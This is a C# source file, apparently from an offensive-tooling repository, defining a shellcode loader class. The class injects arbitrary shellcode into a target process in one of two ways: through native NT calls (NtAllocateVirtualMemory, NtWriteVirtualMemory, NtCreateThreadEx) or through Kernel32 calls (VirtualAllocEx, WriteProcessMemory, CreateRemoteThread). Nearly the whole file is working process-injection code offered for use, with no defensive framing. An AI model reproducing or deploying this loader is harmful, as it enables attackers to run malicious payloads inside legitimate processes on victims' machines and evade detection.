using Microsoft.Win32.SafeHandles;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static ShellCodeLoader.Shared;
/*
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Please let this credit for all the time I worked on ||
 */
namespace ShellCodeLoader
{
    public class ShellCodeLoaderEx
    {
        private byte[] ShellCode;
        private IntPtr ptr;
        private uint RegionSize;
        private Process Target;

        public ShellCodeLoaderEx(Process target, byte[] shellCode)
        {
            this.ShellCode = shellCode;
            this.RegionSize = (uint)shellCode.Length;
            this.ptr = IntPtr.Zero;
            this.Target = target;
        }

        public void LoadWithNT()
        {
            NT();
        }

        public void LoadWithKernel32()
        {
            Kernel32();
        }

        private void NT()
        {
            Imports.NtAllocateVirtualMemory(Target.Handle, ref ptr, IntPtr.Zero, ref RegionSize, TypeAlloc.MEM_COMMIT | TypeAlloc.MEM_RESERVE, PageProtection.PAGE_EXECUTE_READWRITE);
            UIntPtr bytesWritten;
            Imports.NtWriteVirtualMemory(Target.Handle, ptr, ShellCode, (UIntPtr)ShellCode.Length, out bytesWritten);
            PageProtection flOld = new PageProtection();
            Imports.NtProtectVirtualMemory(Target.Handle, ref ptr, ref RegionSize, PageProtection.PAGE_EXECUTE_READ, ref flOld);
            IntPtr hThread = IntPtr.Zero;
            Imports.NtCreateThreadEx(ref hThread, AccessMask.GENERIC_EXECUTE, IntPtr.Zero, Target.Handle, ptr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            //
            //Imports.CLIENT_ID cid = new Imports.CLIENT_ID();
            //Imports.RtlCreateUserThread(Target.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, ptr, IntPtr.Zero, ref hThread, cid);
        }

        private void Kernel32()
        {
            this.ptr = Imports.VirtualAllocEx(Target.Handle, IntPtr.Zero, (IntPtr)ShellCode.Length, TypeAlloc.MEM_COMMIT | TypeAlloc.MEM_RESERVE, PageProtection.PAGE_EXECUTE_READWRITE);
            UIntPtr writtenBytes;
            Imports.WriteProcessMemory(Target.Handle, ptr, ShellCode, (UIntPtr)ShellCode.Length, out writtenBytes);
            PageProtection flOld;
            Imports.VirtualProtectEx(Target.Handle, ptr, RegionSize, PageProtection.PAGE_EXECUTE_READ, out flOld);
            IntPtr hThread = Imports.CreateRemoteThread(Target.Handle, IntPtr.Zero, 0, ptr, IntPtr.Zero, Imports.ThreadCreationFlags.NORMAL, out hThread);
        }

        private static class Imports
        {
            internal const String KERNEL32 = "kernel32.dll";
            internal const String NTDLL = "ntdll.dll";


            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref uint RegionSize, TypeAlloc AllocationType, PageProtection Protect);
           
            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] buffer, UIntPtr bufferSize, out UIntPtr written);
           
            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint numberOfBytes, PageProtection newProtect, ref PageProtection oldProtect);
           
            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, FreeType FreeType);
          
            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtCreateThreadEx(ref IntPtr threadHandle, AccessMask desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);

            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, CLIENT_ID clientId);


            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern IntPtr VirtualAllocEx(IntPtr procHandle,IntPtr address, IntPtr numBytes, TypeAlloc commitOrReserve, PageProtection pageProtectionMode);
          
            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern IntPtr VirtualFree(IntPtr lpAddress, uint dwSize, FreeType FreeType);
           
            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern bool VirtualProtectEx(IntPtr procHandle, IntPtr lpAddress, uint dwSize, PageProtection flNewProtect, out PageProtection lpflOldProtect);
           
            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);
          
            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, ThreadCreationFlags dwCreationFlags, out IntPtr lpThreadId);


            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern IntPtr GetCurrentProcess();
            
            [DllImport(KERNEL32)]
            public static extern IntPtr GetModuleHandle(string lpModuleName);
           
            [DllImport(KERNEL32)]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);


            [Flags]
            public enum ThreadCreationFlags : uint
            {
                NORMAL = 0x0,
                CREATE_SUSPENDED = 0x00000004,
                STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000
            }

            [StructLayout(LayoutKind.Sequential, Pack = 0)]
            public struct CLIENT_ID
            {
                public IntPtr UniqueProcess;
                public IntPtr UniqueThread;
            }
        }

        private bool _disposed = false;

        // Instantiate a SafeHandle instance.
        private SafeHandle _safeHandle = new SafeFileHandle(IntPtr.Zero, true);

        // Public implementation of Dispose pattern callable by consumers.
        public void Dispose() => Dispose(true);

        // Protected implementation of Dispose pattern.
        protected virtual void Dispose(bool disposing)
        {
            if (_disposed)
            {
                return;
            }

            if (disposing)
            {
                // Dispose managed state (managed objects).
                _safeHandle?.Dispose();
            }

            _disposed = true;
            GC.SuppressFinalize(this);
        }
    }
}
